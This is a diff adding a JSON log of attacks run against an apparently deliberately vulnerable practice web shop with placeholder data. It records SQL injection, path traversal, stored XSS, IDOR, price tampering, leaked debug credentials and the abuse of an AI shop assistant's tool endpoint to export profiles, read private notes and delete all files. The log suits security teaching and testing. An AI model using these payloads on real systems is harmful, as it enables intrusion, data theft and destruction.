@@ -1,0 +1,338 @@
+[
+ {
+  "attack": "A01 anonymous profile read",
+  "request": "GET /profile?id=2",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A01 IDOR: alice reads bob profile",
+  "request": "GET /profile?id=2",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A01 anonymous orders (all users)",
+  "request": "GET /orders",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]"
+ },
+ {
+  "attack": "A01 X-Role spoof (no session)",
+  "request": "GET /admin/export",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A01 X-Role spoof (customer session)",
+  "request": "GET /admin/export",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A03 SQLi OR 1=1 in /profile",
+  "request": "GET /profile?id=1%20OR%201%3D1",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A03 SQLi UNION (sqlite_master)",
+  "request": "GET /profile?id=0%20UNION%20SELECT%201%2Csql%2Cname%2Ctype%20FROM%20sqlite_master",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"CREATE TABLE orders(id INTEGER PRIMARY KEY, owner INTEGER, product TEXT, price REAL)\", \"email\": \"orders\", \"address\": \"table\"}, {\"id\": 1, \"name\": \"CREATE TABLE profiles(id INTEGER PRIMARY KEY, name TEXT, email TEXT, address TEXT)\", \"email\": \"profiles\", \"address\": \"table\"}]"
+ },
+ {
+  "attack": "A03 SQLi in /search",
+  "request": "GET /search?q=%27%20OR%20%271%27%3D%271",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A03 SQLi in assistant order_id",
+  "request": "GET /assistant/context?order_id=1%20OR%201%3D1",
+  "body": null,
+  "status": 200,
+  "response": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 1, \\\"owner\\\": 1, \\\"product\\\": \\\"chair\\\", \\\"price\\\": 5000.0}, {\\\"id\\\": 2, \\\"owner\\\": 2, \\\"product\\\": \\\"lamp\\\", \\\"price\\\": 1500.0}]\\nОтзывы: []\\nЗапрос пользователя: Покажи чек по заказу\"}"
+ },
+ {
+  "attack": "A03 SQLi OR 1=1 in /profile (alice token)",
+  "request": "GET /profile?id=1%20OR%201%3D1",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A03 SQLi UNION sqlite_master (alice token)",
+  "request": "GET /profile?id=0%20UNION%20SELECT%201%2Csql%2Cname%2Ctype%20FROM%20sqlite_master",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"CREATE TABLE orders(id INTEGER PRIMARY KEY, owner INTEGER, product TEXT, price REAL)\", \"email\": \"orders\", \"address\": \"table\"}, {\"id\": 1, \"name\": \"CREATE TABLE profiles(id INTEGER PRIMARY KEY, name TEXT, email TEXT, address TEXT)\", \"email\": \"profiles\", \"address\": \"table\"}]"
+ },
+ {
+  "attack": "A03 SQLi in /search (alice token)",
+  "request": "GET /search?q=%27%20OR%20%271%27%3D%271",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A03 enumerate profiles via /search q=TEST (alice token)",
+  "request": "GET /search?q=TEST",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A03 SQLi in assistant order_id (alice token)",
+  "request": "GET /assistant/context?order_id=1%20OR%201%3D1",
+  "body": null,
+  "status": 200,
+  "response": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 1, \\\"owner\\\": 1, \\\"product\\\": \\\"chair\\\", \\\"price\\\": 5000.0}, {\\\"id\\\": 2, \\\"owner\\\": 2, \\\"product\\\": \\\"lamp\\\", \\\"price\\\": 1500.0}]\\nОтзывы: []\\nЗапрос пользователя: Покажи чек по заказу\"}"
+ },
+ {
+  "attack": "A01 alice lists orders",
+  "request": "GET /orders",
+  "body": null,
+  "status": 200,
+  "response": "[{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}]"
+ },
+ {
+  "attack": "Path traversal: private note (alice token)",
+  "request": "GET /files?user=..&path=private/operator-note.txt",
+  "body": null,
+  "status": 200,
+  "response": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}"
+ },
+ {
+  "attack": "IDOR: bob receipt (alice token)",
+  "request": "GET /files?user=bob&path=receipt.txt",
+  "body": null,
+  "status": 200,
+  "response": "{\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}"
+ },
+ {
+  "attack": "Stored XSS payload saved (alice token)",
+  "request": "POST /reviews",
+  "body": {
+   "product": "chair",
+   "text": "<script>alert(document.domain)</script>"
+  },
+  "status": 201,
+  "response": "{\"saved\": true}"
+ },
+ {
+  "attack": "Stored XSS rendered (after save)",
+  "request": "GET /reviews/view",
+  "body": null,
+  "status": 200,
+  "response": "<html><body><p><script>alert(document.domain)</script></p></body></html>"
+ },
+ {
+  "attack": "Debug logs (alice token)",
+  "request": "GET /debug/logs",
+  "body": null,
+  "status": 200,
+  "response": "[{\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Host\": \"127.0.0.1:8067\", \"User-Agent\": \"Python-urllib/3.14\", \"Content-Type\": \"application/json\", \"Connection\": \"close\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=2\", \"body\": {}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Host\": \"127.0.0.1:8067\", \"User-Agent\": \"Python-urllib/3.14\", \"Content-Type\": \"application/json\", \"Connection\": \"close\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=2\", \"body\": {}, \"headers\": {\"Accept-Encoding\": \""
+ },
+ {
+  "attack": "Assistant execute: export (alice token)",
+  "request": "POST /assistant/execute",
+  "body": {
+   "decision": {
+    "tool": "export_profiles",
+    "arguments": {}
+   }
+  },
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "A04 price tampering",
+  "request": "POST /orders",
+  "body": {
+   "product": "chair",
+   "price": 1
+  },
+  "status": 201,
+  "response": "{\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": 1}"
+ },
+ {
+  "attack": "A04 negative price",
+  "request": "POST /orders",
+  "body": {
+   "product": "chair",
+   "price": -5000
+  },
+  "status": 201,
+  "response": "{\"id\": 4, \"owner\": 1, \"product\": \"chair\", \"price\": -5000}"
+ },
+ {
+  "attack": "Path traversal: private note",
+  "request": "GET /files?user=..&path=private/operator-note.txt",
+  "body": null,
+  "status": 200,
+  "response": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}"
+ },
+ {
+  "attack": "IDOR: bob receipt without login",
+  "request": "GET /files?user=bob&path=receipt.txt",
+  "body": null,
+  "status": 200,
+  "response": "{\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}"
+ },
+ {
+  "attack": "Traversal ../bob via path",
+  "request": "GET /files?user=alice&path=../bob/receipt.txt",
+  "body": null,
+  "status": 200,
+  "response": "{\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}"
+ },
+ {
+  "attack": "Path outside sandbox (error leak)",
+  "request": "GET /files?user=alice&path=../../../../etc/passwd",
+  "body": null,
+  "status": 500,
+  "response": "{\"error\": \"outside exercise sandbox\", \"type\": \"ValueError\"}"
+ },
+ {
+  "attack": "Stored XSS payload saved",
+  "request": "POST /reviews",
+  "body": {
+   "product": "chair",
+   "text": "<script>alert(document.domain)</script>"
+  },
+  "status": 201,
+  "response": "{\"saved\": true}"
+ },
+ {
+  "attack": "Stored XSS rendered",
+  "request": "GET /reviews/view",
+  "body": null,
+  "status": 200,
+  "response": "<html><body><p><script>alert(document.domain)</script></p><p><script>alert(document.domain)</script></p></body></html>"
+ },
+ {
+  "attack": "Debug logs leak tokens/passwords",
+  "request": "GET /debug/logs",
+  "body": null,
+  "status": 200,
+  "response": "[{\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Host\": \"127.0.0.1:8067\", \"User-Agent\": \"Python-urllib/3.14\", \"Content-Type\": \"application/json\", \"Connection\": \"close\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=2\", \"body\": {}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Host\": \"127.0.0.1:8067\", \"User-Agent\": \"Python-urllib/3.14\", \"Content-Type\": \"application/json\", \"Connection\": \"close\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=2\", \"body\": {}, \"headers\": {\"Accept-Encoding\": \""
+ },
+ {
+  "attack": "Error leak: malformed body",
+  "request": "POST /orders",
+  "body": {},
+  "status": 500,
+  "response": "{\"error\": \"'product'\", \"type\": \"KeyError\"}"
+ },
+ {
+  "attack": "Assistant execute: export without auth",
+  "request": "POST /assistant/execute",
+  "body": {
+   "decision": {
+    "tool": "export_profiles",
+    "arguments": {}
+   }
+  },
+  "status": 200,
+  "response": "[{\"id\": 1, \"name\": \"TEST_ALICE\", \"email\": \"alice@example.invalid\", \"address\": \"TEST_ADDRESS_A\"}, {\"id\": 2, \"name\": \"TEST_BOB\", \"email\": \"bob@example.invalid\", \"address\": \"TEST_ADDRESS_B\"}]"
+ },
+ {
+  "attack": "Assistant execute: read operator note",
+  "request": "POST /assistant/execute",
+  "body": {
+   "decision": {
+    "tool": "read_file",
+    "arguments": {
+     "path": "private/operator-note.txt"
+    }
+   }
+  },
+  "status": 200,
+  "response": "{\"content\": \"TEST_ONLY_OPERATOR_SECRET\"}"
+ },
+ {
+  "attack": "Assistant execute: read bob receipt",
+  "request": "POST /assistant/execute",
+  "body": {
+   "decision": {
+    "tool": "read_file",
+    "arguments": {
+     "path": "files/bob/receipt.txt"
+    }
+   }
+  },
+  "status": 200,
+  "response": "{\"content\": \"TEST_BOB receipt: lamp, 1500 RUB\"}"
+ },
+ {
+  "attack": "Assistant context: foreign order",
+  "request": "GET /assistant/context?order_id=2",
+  "body": null,
+  "status": 200,
+  "response": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 2, \\\"owner\\\": 2, \\\"product\\\": \\\"lamp\\\", \\\"price\\\": 1500.0}]\\nОтзывы: [{\\\"product\\\": \\\"chair\\\", \\\"text\\\": \\\"<script>alert(document.domain)</script>\\\"}, {\\\"product\\\": \\\"chair\\\", \\\"text\\\": \\\"<script>alert(document.domain)</script>\\\"}]\\nЗапрос пользователя: Покажи чек по заказу\"}"
+ },
+ {
+  "attack": "Brute force login (30 tries)",
+  "statuses": [
+   401
+  ]
+ },
+ {
+  "attack": "Assistant execute: delete_tree files/bob",
+  "request": "POST /assistant/execute",
+  "body": {
+   "decision": {
+    "tool": "delete_tree",
+    "arguments": {
+     "path": "files/bob"
+    }
+   }
+  },
+  "status": 200,
+  "response": "{\"deleted\": \"files/bob\"}"
+ },
+ {
+  "attack": "Bob receipt after delete",
+  "request": "GET /files?user=bob&path=receipt.txt",
+  "body": null,
+  "status": 500,
+  "response": "{\"error\": \"[Errno 2] No such file or directory: '/private/var/folders/td/xyy10qws2kq4g4fml7bvrxpc0000gn/T/itmo-practice-06-m7yyrt_m/files/bob/receipt.txt'\", \"type\": \"FileNotFoundError\"}"
+ },
+ {
+  "attack": "Assistant execute: delete_tree . (everything)",
+  "request": "POST /assistant/execute",
+  "body": {
+   "decision": {
+    "tool": "delete_tree",
+    "arguments": {
+     "path": "."
+    }
+   }
+  },
+  "status": 200,
+  "response": "{\"deleted\": \".\"}"
+ },
+ {
+  "attack": "Health after wipe",
+  "request": "GET /health",
+  "body": null,
+  "status": 200,
+  "response": "{\"status\": \"ok\"}"
+ },
+ {
+  "attack": "Alice receipt after wipe",
+  "request": "GET /files?user=alice&path=receipt.txt",
+  "body": null,
+  "status": 500,
+  "response": "{\"error\": \"[Errno 2] No such file or directory: '/private/var/folders/td/xyy10qws2kq4g4fml7bvrxpc0000gn/T/itmo-practice-06-m7yyrt_m/files/alice/receipt.txt'\", \"type\": \"FileNotFoundError\"}"
+ }
+]
